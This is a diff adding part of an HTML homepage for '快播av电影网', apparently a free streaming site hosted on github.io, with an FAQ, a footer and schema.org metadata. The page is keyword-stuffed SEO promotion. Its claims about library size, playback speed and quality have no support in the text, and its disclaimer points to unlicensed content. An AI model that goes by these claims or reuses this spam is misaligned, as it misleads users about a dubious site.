+          <a href="#"><strong>极限挑战营</strong><span>第 15 期 · 8.4</span></a>
+          <a href="#"><strong>蔚蓝之下</strong><span>6 集全 · 9.2</span></a>
+          <a href="#"><strong>街角小馆</strong><span>30 集全 · 8.3</span></a>
+          <a href="#"><strong>厨房交响曲</strong><span>第 9 期 · 8.8</span></a>
+        </div>
+      </details>
+    </div>
+  </section>
+
+  <!-- ========== 栏目6 关于 + FAQ ========== -->
+  <section class="sec wrap" id="about">
+    <div class="ch">
+      <h2>关于快播av电影网 <small>https://kuaiboavdianyingwang-cn.github.io</small></h2>
+    </div>
+    <article class="about">
+      <h2>快播av电影网 — 把加载时间还给观影</h2>
+      <p>快播av电影网（网址 https://kuaiboavdianyingwang-cn.github.io）是一个免费在线观影站点，内容覆盖电影、电视剧、动漫、综艺、短剧、纪录片六大形态，细分 14 个频道。我们做的第一件事，是让片子在最短时间内开始播放。</p>
+      <div class="code"><b>$</b> kuaibo --info
+  name     : 快播av电影网
+  url      : https://kuaiboavdianyingwang-cn.github.io
+  library  : 86,400 条目 / 14 频道
+  update   : 每晚 20:00 批量上新
+  quality  : 720P / 1080P / 4K
+  device   : 手机 / 平板 / 电脑 自适应
+  account  : 无需注册，全站免费</div>
+      <p>平均起播耗时控制在 0.8 秒以内，支持断点续播与多清晰度切换；手机端自动适配布局，投屏大屏可切 4K。看片不等待，就上快播av电影网。</p>
+      <div class="kws">
+        <span>快播av电影网</span>
+        <span>kuaiboavdianyingwang-cn.github.io</span>
+        <span>高清电影在线观看</span>
+        <span>电视剧免费在线观看</span>
+        <span>极速播放不卡顿</span>
+        <span>最新影视免费播放</span>
+      </div>
+    </article>
+
+    <div class="faq">
+      <details open>
+        <summary>快播av电影网需要注册或付费吗？</summary>
+        <p>都不需要。打开 https://kuaiboavdianyingwang-cn.github.io 即可搜索并播放，全站免费开放，无需注册登录。</p>
+      </details>
+      <details>
+        <summary>播放卡顿应该怎么处理？</summary>
+        <p>可先切到「流畅」720P 档位；使用 Wi-Fi 或信号稳定环境可切「高清」1080P；投屏大屏时再选「超清」4K。</p>
+      </details>
+      <details>
+        <summary>手机打开会自动适配屏幕吗？</summary>
+        <p>会。全站采用响应式设计，窄屏下搜索框换到第二行，磁贴墙降为两列，播放进度条独占一行，横竖屏均可正常播放。</p>
+      </details>
+      <details>
+        <summary>影片多久更新一次？</summary>
+        <p>每晚 20:00 固定批量上新，热播剧集与院线新片额外即时跟进，正在播放列表与片库目录每小时刷新。</p>
+      </details>
+    </div>
+  </section>
+
+</main>
+
+<!-- ========== 页脚 ========== -->
+<footer class="foot">
+  <div class="wrap">
+    <div class="fg">
+      <div>
+        <h4>快播av电影网</h4>
+        <p class="u">网站网址：https://kuaiboavdianyingwang-cn.github.io</p>
+        <p>高清影视极速在线观看 · 每日更新 · 无需注册</p>
+        <p>加载快一点，看得爽一点。</p>
+      </div>
+      <div>
+        <h4>影视分类</h4>
+        <a href="#">最新电影</a>
+        <a href="#">热播剧集</a>
+        <a href="#">人气动漫</a>
+        <a href="#">热门综艺</a>
+      </div>
+      <div>
+        <h4>发现内容</h4>
+        <a href="#">频道磁贴</a>
+        <a href="#">正在播放</a>
+        <a href="#">片库目录</a>
+        <a href="#">分类按键</a>
+      </div>
+      <div>
+        <h4>站点信息</h4>
+        <a href="#">关于我们</a>
+        <a href="#">免责声明</a>
+        <a href="#">意见反馈</a>
+        <a href="#">友情链接</a>
+      </div>
+    </div>
+    <div class="bot">
+      <span>© 2026 快播av电影网 版权所有</span>
+      <span>本站内容均来自互联网公开信息，版权归原作者所有</span>
+    </div>
+  </div>
+</footer>
+
+<a class="up" href="#home" aria-label="返回顶部">↑</a>
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@graph": [
+    {
+      "@type": "WebSite",
+      "@id": "https://kuaiboavdianyingwang-cn.github.io/#website",
+      "url": "https://kuaiboavdianyingwang-cn.github.io/",
+      "name": "快播av电影网",
+      "alternateName": "快播av电影网官网",
+      "description": "快播av电影网提供高清电影、热播电视剧、动漫综艺极速在线观看，边下边播、加载快、每日更新、无需注册、手机电脑多端自适应。",
+      "inLanguage": "zh-CN",
+      "publisher": { "@id": "https://kuaiboavdianyingwang-cn.github.io/#organization" },
+      "potentialAction": {
+        "@type": "SearchAction",
+        "target": { "@type": "EntryPoint", "urlTemplate": "https://kuaiboavdianyingwang-cn.github.io/?q={search_term_string}" },
+        "query-input": "required name=search_term_string"
+      }
+    },
+    {
+      "@type": "Organization",
+      "@id": "https://kuaiboavdianyingwang-cn.github.io/#organization",
+      "name": "快播av电影网",
+      "url": "https://kuaiboavdianyingwang-cn.github.io/",
+      "logo": "https://kuaiboavdianyingwang-cn.github.io/static/logo.png"
+    },
+    {
+      "@type": "WebPage",
+      "@id": "https://kuaiboavdianyingwang-cn.github.io/#webpage",
+      "url": "https://kuaiboavdianyingwang-cn.github.io/",
+      "name": "快播av电影网 - 高清电影电视剧极速在线观看_最新影视免费播放",
+      "isPartOf": { "@id": "https://kuaiboavdianyingwang-cn.github.io/#website" },
+      "about": "快播av电影网高清影视极速在线观看首页",
+      "inLanguage": "zh-CN"
+    },
+    {
+      "@type": "BreadcrumbList",
+      "itemListElement": [
+        { "@type": "ListItem", "position": 1, "name": "快播av电影网", "item": "https://kuaiboavdianyingwang-cn.github.io/" }
+      ]
+    }
+  ]
+}
+</script>
+
+</body>
+</html>
